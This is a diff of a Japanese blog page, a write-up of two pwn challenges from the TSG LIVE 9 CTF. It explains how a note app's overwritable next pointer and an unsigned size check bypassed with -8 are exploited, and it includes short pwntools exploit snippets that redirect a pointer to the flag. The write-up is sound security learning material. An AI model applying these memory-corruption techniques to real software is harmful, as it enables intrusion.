@@ -1,5 +1,13 @@
+---
+layout: page
+title: TSG LIVE 9 CTF
+parent: CTF Writeups
+nav_order: 2
+---
+
 # 結果
-2022/11/19に行われたTSG LIVE 9 CTFに、Float Lariatとして出てきました。
+
+2022/11/19 に行われた TSG LIVE 9 CTF に、Float Lariat として出てきました。
 頑張って、頑張った結果、一位を取れました。嬉しいね。
 
 僕が解いた問題は
@@ -14,6 +22,7 @@
 以下のソースコードと、バイナリが渡されます。
 
 checksec
+
 ```
 Arch:     amd64-64-little
 RELRO:    Partial RELRO
@@ -156,11 +165,11 @@ void print_note(unsigned idx) {
     Page **cur = &notes[idx];
     while(*cur != NULL) {
         printf("%s\n", (*cur)->content);
-        puts("\n------------\n"); 
+        puts("\n------------\n");
         cur = &(*cur)->next;
     }
 }
-    
+
 int main(void) {
     init();
     unsigned idx1, idx2, idx3;
@@ -172,7 +181,7 @@ int main(void) {
         switch (main_menu()) {
             case 1:
                 page_main(get_note_index("note index")); break;
-            case 2: 
+            case 2:
                 idx1 = get_note_index("note index 1");
                 idx2 = get_note_index("note index 2");
                 idx3 = get_note_index("note index 3");
@@ -188,9 +197,9 @@ int main(void) {
 ```
 
 簡単なメモアプリっぽいですね。
-グローバルな `notes` に先頭ポインタが40個入っていて、そこから next を手繰っていくアプリケーションです。
+グローバルな `notes` に先頭ポインタが 40 個入っていて、そこから next を手繰っていくアプリケーションです。
 
-さて、この問題はpwn全三問シリーズの一問目で、二問目はこの問題のセキュリティにパッチを当てたらしいことが仄めかされています。そこで diff を使ってソースコードを比較することにしました。
+さて、この問題は pwn 全三問シリーズの一問目で、二問目はこの問題のセキュリティにパッチを当てたらしいことが仄めかされています。そこで diff を使ってソースコードを比較することにしました。
 
 ```diff
 85c85
@@ -199,10 +208,11 @@ int main(void) {
 >     readn(page->content, size);
 ```
 
-add_page 内の readn が修正されているようです。上の場合、page に入力が入るので、nextが変更できてしまうことがわかります。これではいけませんね。
-ということで、入力にflagが入ったポインタ-8を入れ、contentがflagを指すようにしたところ、取れました。
+add_page 内の readn が修正されているようです。上の場合、page に入力が入るので、next が変更できてしまうことがわかります。これではいけませんね。
+ということで、入力に flag が入ったポインタ-8 を入れ、content が flag を指すようにしたところ、取れました。
 
 exploit.py
+
 ```python
 io.sendline(b'0')
 io.sendline(b'1')
@@ -216,6 +226,7 @@ io.sendline(pack(binary.symbols['flag'] - 8))
 ## LooseLeaf(pwn)
 
 checksec
+
 ```
 Arch:     amd64-64-little
 RELRO:    Partial RELRO
@@ -224,7 +235,7 @@ NX:       NX enabled
 PIE:      No PIE (0x400000)
 ```
 
-同じように二問目と三問目でdiffを取ると、
+同じように二問目と三問目で diff を取ると、
 
 ```diff
 81a82
@@ -233,7 +244,7 @@ PIE:      No PIE (0x400000)
 
 何やらサイズチェックが入っているのがわかります。
 
-mallocに入れる値だからチェックしても変わらなさそうだなぁと思いつつよく見てみると、sizeの型がunsignedなことに気が付きます。
+malloc に入れる値だからチェックしても変わらなさそうだなぁと思いつつよく見てみると、size の型が unsigned なことに気が付きます。
 
 もし `size = get_int()` が -8 を返してきた場合、unsigned な型に入るので、オーバーフローして 4294967288 になります。
 
@@ -241,7 +252,7 @@ size + 8 は 0 なので、malloc は 適当なポインタを取ってきます
 
 その操作を broken_alloc として、
 
-```
+````
 idx0 = alloc(0x8)
 deallocate(idx0) // tcache(0x8) -> idx0
 
@@ -259,8 +270,9 @@ delete_page(0)
 add_page(0, 0x100, b'big!')
 
 add_page(0, ctypes.c_uint32(-8).value, pack(0xdeadbeef) + pack(0xcafebabe) + pack(0x11111111) + pack(binary.symbols['flag'] - 8))
-```
+````
 
 # 感想
+
 自明な脆弱性からちょっと一手間で解ける感じの問題で楽しかった。
-LoooseLeft(3問目)も通したかった
+LoooseLeft(3 問目)も通したかった
